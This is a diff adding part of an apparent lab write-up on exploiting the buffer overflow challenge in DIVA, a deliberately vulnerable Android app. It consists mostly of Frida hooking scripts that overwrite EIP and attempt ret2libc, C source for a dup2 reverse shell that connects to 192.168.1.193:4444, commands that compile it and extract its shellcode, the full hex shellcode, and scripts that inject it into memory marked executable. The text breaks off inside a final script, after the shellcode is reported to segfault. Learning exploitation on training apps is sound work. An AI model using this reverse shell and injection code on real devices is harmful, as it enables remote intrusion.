@@ -389,15 +389,628 @@ tuvwxyz{|}~
   Abort message: 'art/runtime/java_vm_ext.cc:470] JNI DETECTED ERROR IN APPLICATION: GetStringUTFChars received NULL jstring'
 </p>
 <br>At this point we read about Java.vm.getEnv() and wrote this script that calculate the offset of our function from the functions pointer table. 
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var env = Java.vm.getEnv();
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var handlePointer = Memory.readPointer(env.handle);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] Java.vm.env handle: " + handlePointer);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var GetStringUTFChars = ptr(handlePointer - 0x60d9b4);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] GetStringUTFChars addr: " + GetStringUTFChars);
+<br>&nbsp;}
+<br>&nbsp;&nbsp;catch(e) {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
+<br>&nbsp;&nbsp;}
+<br>});
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Now we done some tests to understand what goes on under the hood
+<br>We set some breakpoints and stepping into function, with an eye to stack and register in search of my input.
+<br>![14-61](https://teckk2.github.io/assets/images/DIVA/14-61.png)
+<br>In the above screenshot we can see that our input in memory is exactly what we send but in this phase It added a 00 byte behind every bytes we send.
+<br>We do custom gef layout to watch registers, code, stack, and a particular area of memory where our input resides, with the following commands.
+<p class="message">
+  gef➤  gef config context.layout "regs code args stack -source -legend -threads -trace extra memory"
+  gef➤  memory watch 0x12d0a7d0 0x50 byte
+</p>
+<br>And the result is:
+<br>![14-62](https://teckk2.github.io/assets/images/DIVA/14-62.png)
+<br>Step by step we found one bad guy
+<br>![14-63](https://teckk2.github.io/assets/images/DIVA/14-63.png)
+<br>![14-64](https://teckk2.github.io/assets/images/DIVA/14-64.png)
+<br>![14-65](https://teckk2.github.io/assets/images/DIVA/14-65.png)
+<br>![14-66](https://teckk2.github.io/assets/images/DIVA/14-66.png)
+<br>In the end the real culprit seems to be the function ConvertUtf16ToModifiedUtf8 but we can interact at GetStringUTFChars level.
+<br>Finally KNX wrote the hooking script that replace return value of GetStringUTFChars
+<br>![14-67](https://teckk2.github.io/assets/images/DIVA/14-67.png)
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var env = Java.vm.getEnv();
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var handlePointer = Memory.readPointer(env.handle);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] env handle: " + handlePointer);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var GetStringUTFChars = ptr(handlePointer - 0x60d9b4);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] GetStringUTFChars addr: " + GetStringUTFChars);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(GetStringUTFChars, {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function(retval){
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(36);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x60, 0x4e, 0xb0, 0xee]);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var fuck = retval.readCString();
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(fuck == "bof"){
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;&nbsp;&nbsp;});
+<br>&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;catch(e) {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
+<br>&nbsp;&nbsp;}
+<br>});
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>![14-68](https://teckk2.github.io/assets/images/DIVA/14-68.png)
+<br>It works!! We finally overwritten EIP with the address we want.
+<br>Now one more question arise, can we exploit with ret2libc now?
+<br>OK, now that we have complete control over EIP, you have to bypass NX and ASLR. For ASLR there is no problem, Frida has the hook in realtime so she can find us the memory addresses we need, but NX? As always we can bypass it with the ret2libc.
+<br>In real Android device we have to do some ROP chain to pop the address of the command to execute to R0, but I am in android studio x86 :)
+<br>For more information return to r0 here: [https://blog.attify.com/demystifying-ret2zp/](https://blog.attify.com/demystifying-ret2zp/)
+<br>**How to write system address to EIP?**
+<br>KNX made this script that takes system address, split it into bytes and add to bytearray. If we insert "bof" in editText and push redbutton, it replace in memory mine byte array and overwrite EIP with system address, Yeah :)
+<br>![14-69](https://teckk2.github.io/assets/images/DIVA/14-69.png)
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var env = Java.vm.getEnv();
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var handlePointer = Memory.readPointer(env.handle);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] Java.vm.env handle: " + handlePointer);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var GetStringUTFChars = ptr(handlePointer - 0x60d9b4);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] GetStringUTFChars addr: " + GetStringUTFChars);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(GetStringUTFChars, {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function(retval){
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var system = Module.findExportByName("/system/lib/libc.so", "system");
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] System Address is: " + system);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var ps = system.toString().match(/[\s\S]{1,2}/g) || [];
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(36);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var blah = [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41];
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;blah.push(parseInt(ps[4], 16), parseInt(ps[3], 16), parseInt(ps[2], 16), parseInt(ps[1], 16));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, blah);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var fuck = retval.readCString();
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(fuck == "bof"){
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;&nbsp;&nbsp;});
+<br>&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;catch(e) {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
+<br>&nbsp;&nbsp;}
+<br>});
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Anyway we can’t found a way to exploit ret2libc.
+<br>**Another method is Dup2 shellcode**
+<br>Ok we can overwrite EIP, ret2libc fails, and now?
+<br>Now I try to inject in memory a reverse shell, make memory executable and jump to shellcode.
+<br>In our plan the steps we need are:
+<br>&nbsp;&nbsp;1. Find reverse shell
+<br>&nbsp;&nbsp;2. Cross-Compile it
+<br>&nbsp;&nbsp;3. Test it
+<br>&nbsp;&nbsp;4. If it works, extract hex bytes
+<br>&nbsp;&nbsp;5. Put bytes in executable memory area
+<br>&nbsp;&nbsp;6. Overwrite EIP to jump to shellcode
+<br>The main challenge was to find a working dup2 shellcode
+<br>![14-70](https://teckk2.github.io/assets/images/DIVA/14-70.png)
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>#include <stdio.h>
+<br>#include <unistd.h>
+<br>#include <netinet/in.h>
+<br>#include <sys/types.h>
+<br>#include <sys/socket.h>
+<br>
+<br>#define REMOTE_ADDR "192.168.1.193"
+<br>#define REMOTE_PORT 4444
+<br>
+<br>int main(int argc, char \*argv[])
+<br>{
+<br>&nbsp;&nbsp;&nbsp;&nbsp;struct sockaddr_in sa;
+<br>&nbsp;&nbsp;&nbsp;&nbsp;int s;
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;sa.sin_family = AF_INET;
+<br>&nbsp;&nbsp;&nbsp;&nbsp;sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;sa.sin_port = htons(REMOTE_PORT);
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;s = socket(AF_INET, SOCK_STREAM, 0);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;connect(s, (struct sockaddr *)&sa, sizeof(sa));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;dup2(s, 0);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;dup2(s, 1);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;dup2(s, 2);
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;execve("system/bin/sh", 0, 0);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;return 0;
+<br>}
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Now Cross-compile it with gcc-multilib
+<br>We have to install gcc multilib package to cross compiler
+<p class="message">
+  apt-get install gcc-multilib
+</p>
+<br>Then we need to compile it statically (to avoid the issue to missing library to android)
+<p class="message">
+  gcc -m32 test.c -o test -static
+</p>
+<br>![14-71](https://teckk2.github.io/assets/images/DIVA/14-71.png)
+<br>It works!
+<br>Now extract HexBytes shellcode
+<p class="message">
+  objdump -d ./test|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+</p>
+<br>Oh shit! Static compilation generated a very very large shellcode, 1.6 MB.
+<br>We need to find a way to cross-compiling dynamic binary.
+<br>**Cross Compiling C/C++ for Android**
+<br>We followed this post: [http://nickdesaulniers.github.io/blog/2016/07/01/android-cli/](http://nickdesaulniers.github.io/blog/2016/07/01/android-cli/)
+<br>Download Android NDK
+<p class="message">
+  curl -O http://dl.google.com/android/repository/android-ndk-r12b-linux-x86_64.zip
+</p>
+<br>Unzip it
+<p class="message">
+  unzip android-ndk-r12b-linux-x86_64.zip
+</p>
+<br>Install adb and fastboot (if they are not already installed)
+<p class="message">
+  sudo apt-get install android-tools-adb android-tools-fastboot
+</p>
+<br>Create Android toolchain for my architecture (x86)
+<p class="message">
+  ./android-ndk-r12b/build/tools/make_standalone_toolchain.py --arch x86 --install-dir x86/
+</p>
+<p class="message">
+  PATH=$PATH:/x86 #adjust to your install-dir
+</p>
+<br>**Testing it**
+<p class="message">
+  <br>cd /x86/bin
+  <br>./clang test.c -pie -o test
+</p>
+<p class="message">
+  <br>root@GroundZero:~/Test_DIVA# file test
+  <br>test: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), 
+  <br>dynamically linked, interpreter /system/bin/linker, not stripped
+</p>
+<br>Yeah! Now test reverse shell
+<br>![14-72](https://teckk2.github.io/assets/images/DIVA/14-72.png)
+<br>The generated binary is 4,4K And it works!!
+<p class="message">
+  objdump -d ./test|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' > hexdump.txt
+</p>
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>root@GroundZero:~/Test_DIVA# cat hexdump.txt 
+<br>"\xff\xb3\x04\x00\x00\x00\xff\xa3\x08\x00\x00\x00\x00\x00\xff\xa3\x0c\x00\x00\x00\x68\x00\x00\x00\x00\xe9\xe0\xff\xff\xff\xff\xa3\x10\x00\x00\x00\x68\x08\x00\x00\x00\xe9\xd0\xff\xff\xff\xff\xa3\x14\x00\x00\x00\x68\x10\x00\x00\x00\xe9\xc0\xff\xff\xff\xff\xa3\x18\x00\x00\x00\x68\x18\x00\x00\x00\xe9\xb0\xff\xff\xff\xff\xa3\x1c\x00\x00\x00\x68\x20\x00\x00\x00\xe9\xa0\xff\xff\xff\xff\xa3\x20\x00\x00\x00\x68\x28\x00\x00\x00\xe9\x90\xff\xff\xff\xff\xa3\x24\x00\x00\x00\x68\x30\x00\x00\x00\xe9\x80\xff\xff\xff\xff\xa3\x28\x00\x00\x00\x68\x38\x00\x00\x00\xe9\x70\xff\xff\xff\x8d\x64\x24\xf4\x8b\x44\x24\x10\x85\xc0\x74\x02\xff\xd0\x8d\x64\x24\x0c\xc3\x8d\xb6\x00\x00\x00\x00\x8d\xbc\x27\x00\x00\x00\x55\x89\xe5\x53\xe8\xb2\x00\x00\x00\x81\xc3\x0f\x14\x00\x00\x83\xe4\xf0\x8d\x64\x24\xe0\x8d\x83\x3c\x00\x00\x00\xc7\x44\x24\x04\x00\x00\x00\x89\x44\x24\x14\x8d\x83\x34\x00\x00\x00\x89\x44\x24\x18\x8d\x83\x2c\x00\x00\x00\x89\x44\x24\x1c\x8d\x44\x24\x14\x89\x44\x24\x0c\x8d\x83\xa8\xec\xff\xff\x89\x44\x24\x08\x8d\x45\x04\x89\x04\x24\xe8\x07\xff\xff\xff\x8d\xb4\x26\x00\x00\x00\x53\xe8\x55\x00\x00\x00\x81\xc3\xb2\x13\x00\x00\x8d\x64\x24\xe8\x8d\x83\x44\x00\x00\x00\x89\x44\x24\x08\x8b\x44\x24\x20\x89\x44\x24\x04\x8d\x83\xc8\xeb\xff\xff\x89\x04\x24\xe8\xe0\xfe\xff\xff\x8d\x64\x24\x18\x5b\xc3\x8d\x76\x00\x8d\xbc\x27\x00\x00\x00\x53\xe8\x15\x00\x00\x00\x81\xc3\x72\x13\x00\x00\x8d\x64\x24\xf8\xe8\xcb\xfe\xff\xff\x8d\x64\x24\x08\x5b\xc3\x8b\x1c\x24\xc3\x90\x55\x89\xe5\x53\x56\x83\xec\x70\xe8\x00\x00\x00\x00\x58\x81\xc0\x4b\x13\x00\x00\x8b\x4d\x0c\x8b\x55\x08\x8d\xb0\x00\xee\xff\xff\xc7\x45\xf4\x00\x00\x00\x89\x55\xf0\x89\x4d\xec\x66\xc7\x45\xd8\x02\x00\x89\x34\x24\x89\xc3\x89\x45\xd0\xe8\x90\xfe\xff\xff\xb9\x02\x00\x00\x00\xba\x01\x00\x00\x00\x31\xf6\x89\x45\xdc\x66\xc7\x45\xda\x11\x5c\xc7\x04\x24\x02\x00\x00\xc7\x44\x24\x04\x01\x00\x00\xc7\x44\x24\x08\x00\x00\x00\x8b\x5d\xd0\x89\x75\xcc\x89\x4d\xc8\x89\x55\xc4\xe8\x63\xfe\xff\xff\xb9\x10\x00\x00\x00\x8d\x55\xd8\x89\x45\xd4\x8b\x45\xd4\x89\x04\x24\x89\x54\x24\x04\xc7\x44\x24\x08\x10\x00\x00\x8b\x5d\xd0\x89\x4d\xc0\xe8\x4b\xfe\xff\xff\x31\xc9\x8b\x55\xd4\x89\x14\x24\xc7\x44\x24\x04\x00\x00\x00\x8b\x5d\xd0\x89\x45\xbc\x89\x4d\xb8\xe8\x3d\xfe\xff\xff\xb9\x01\x00\x00\x00\x8b\x55\xd4\x89\x14\x24\xc7\x44\x24\x04\x01\x00\x00\x8b\x5d\xd0\x89\x45\xb4\x89\x4d\xb0\xe8\x1c\xfe\xff\xff\xb9\x02\x00\x00\x00\x8b\x55\xd4\x89\x14\x24\xc7\x44\x24\x04\x02\x00\x00\x8b\x5d\xd0\x89\x45\xac\x89\x4d\xa8\xe8\xfb\xfd\xff\xff\x8b\x4d\xd0\x8d\x91\x0e\xee\xff\xff\x31\xf6\x89\x14\x24\xc7\x44\x24\x04\x00\x00\x00\xc7\x44\x24\x08\x00\x00\x00\x89\xcb\x89\x45\xa4\x89\x75\xa0\xe8\xe0\xfd\xff\xff\x31\xc9\x89\x45\x9c\x89\xc8\x83\xc4\x70\x5e\x5b\x5d\xc3"
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>This time it is more friendly :)
+<br>Now we will put bytes in executable memory area (or make it executable)
+<br>I done it but we have 2 issues.
+<br>![14-73](https://teckk2.github.io/assets/images/DIVA/14-73.png)
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var env = Java.vm.getEnv();
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var handlePointer = Memory.readPointer(env.handle);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] Java.vm.env handle: " + handlePointer);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var GetStringUTFChars = ptr(handlePointer - 0x60d9b4);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] GetStringUTFChars addr: " + GetStringUTFChars);
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(GetStringUTFChars, {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function(retval){
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var fuck = retval.readCString();
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(fuck == "bof"){
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(40);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var blah = [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41];
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var sh = Memory.alloc(1024);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var shell = [0xff, 0xb3, 0x04, 0x00, 0x00, 0x00, 0xff, 0xa3, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xa3, 0x0c, 0x00, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00, 0x00, 0xe9, 0xe0, 0xff, 0xff, 0xff, 0xff, 0xa3, 0x10, 0x00, 0x00, 0x00, 0x68, 0x08, 0x00, 0x00, 0x00, 0xe9, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xa3, 0x14, 0>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var ps = sh.toString().match(/[\s\S]{1,2}/g) || [];
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;blah.push(parseInt(ps[4], 16), parseInt(ps[3], 16), parseInt(ps[2], 16), parseInt(ps[1], 16), 0xCC);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, blah);
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(sh, shell);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.protect(ptr(sh), 1024, 'rwx');
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(sh);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(st));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(sh, {length: 1024}));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<br>}
+<br>&nbsp;&nbsp;&nbsp;&nbsp;});
+<br>&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;catch(e) {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
+<br>&nbsp;&nbsp;}
+<br>});
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>In this case we created 2 memory areas, one for our buffer overflow trigger (A*32 + RET) and other for shellcode.
+<br>Yes, we also make executable the shellcode area, and Yes all math operation is right, but it doesn’t work.
+<br>Why? Because when we replace our input with our bof trigger, the function GetStringUtfChars exit, and immediately call ReleaseGetStringUtfChars that free the shellcode memory area. The result is when EIP try to jump to shellcode, it lead to a junk memory area.
+<br>We tried a second way, we put shellcode immediately after RET in my buffer trigger string, but unfortunately the buffer is too small.
+<br>Now put shellcode in a static memory area
+<br>Finally we choose to overwrite an already exists memory area instead use heap.
+<br>Two possible candidates are:
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<p class="message">
+<br>&nbsp;&nbsp;{
+<br>&nbsp;&nbsp;&nbsp;&nbsp;"name": "base.odex",
+<br>&nbsp;&nbsp;&nbsp;&nbsp;"base": "0xcf4c8000",
+<br>&nbsp;&nbsp;&nbsp;&nbsp;"size": 3670016,
+<br>&nbsp;&nbsp;&nbsp;&nbsp;"path": "/data/app/jakhar.aseem.diva-1/oat/x86/base.odex"
+<br>&nbsp;&nbsp;},
+<br>&nbsp;&nbsp;{
+<br>&nbsp;&nbsp;&nbsp;&nbsp;"name": "libdivajni.so",
+<br>&nbsp;&nbsp;&nbsp;&nbsp;"base": "0xe30aa000",
+<br>&nbsp;&nbsp;&nbsp;&nbsp;"size": 12288,
+<br>&nbsp;&nbsp;&nbsp;&nbsp;"path": "/data/app/jakhar.aseem.diva-1/lib/x86/libdivajni.so"
+<br>&nbsp;&nbsp;},
+</p>
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>But we cannot forget that ASLR is enabled, this means the libs are randomized. Left to try to app base address.
+<br>After reboot we can see\
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<p class="message">
+<br>&nbsp;&nbsp;{
+<br>&nbsp;&nbsp;&nbsp;&nbsp;"name": "base.odex",
+<br>&nbsp;&nbsp;&nbsp;&nbsp;"base": "0xcf8d9000",
+<br>&nbsp;&nbsp;&nbsp;&nbsp;"size": 3670016,
+<br>&nbsp;&nbsp;&nbsp;&nbsp;"path": "/data/app/jakhar.aseem.diva-1/oat/x86/base.odex"
+<br>&nbsp;&nbsp;},
+<br>&nbsp;&nbsp;{
+<br>&nbsp;&nbsp;&nbsp;&nbsp;"name": "libdivajni.so",
+<br>&nbsp;&nbsp;&nbsp;&nbsp;"base": "0xcf77b000",
+<br>&nbsp;&nbsp;&nbsp;&nbsp;"size": 12288,
+<br>&nbsp;&nbsp;&nbsp;&nbsp;"path": "/data/app/jakhar.aseem.diva-1/lib/x86/libdivajni.so"
+<br>&nbsp;&nbsp;},
+</p>
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Oh no, binary has compiled with PIE.
+<br>Ok we have to find module address at runtime with frida.
+<br>It works!! But shellcode SEGFAULT.
+<br>![14-74](https://teckk2.github.io/assets/images/DIVA/14-74.png)
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var env = Java.vm.getEnv();
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var handlePointer = Memory.readPointer(env.handle);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] Java.vm.env handle: " + handlePointer);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var GetStringUTFChars = ptr(handlePointer - 0x60d9b4);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] GetStringUTFChars addr: " + GetStringUTFChars);
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(GetStringUTFChars, {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function(retval){
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var fuck = retval.readCString();
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(40);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var blah = [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41];
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var shell = [0xff, 0xb3, 0x04, 0x00, 0x00, 0x00, 0xff, 0xa3, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xa3, 0x0c, 0x00, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00, 0x00, 0xe9, 0xe0, 0xff, 0xff, 0xff, 0xff, 0xa3, 0x10, 0x00, 0x00, 0x00, 0x68, 0x08, 0x00, 0x00, 0x00, 0xe9, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xa3, 0x14, 0x00];
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var sh = Process.getModuleByName('base.odex').base;
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.protect(ptr(sh), 1024, 'rwx');
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(sh, shell);
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var ps = sh.toString().match(/[\s\S]{1,2}/g) || [];
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;blah.push(parseInt(ps[4], 16), parseInt(ps[3], 16), parseInt(ps[2], 16), parseInt(ps[1], 16));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, blah);
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(fuck == "bof"){
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(sh);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(st));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(sh, {length: 1024}));
+<br>}
+<br>&nbsp;&nbsp;&nbsp;&nbsp;});
+<br>&nbsp;&nbsp;}
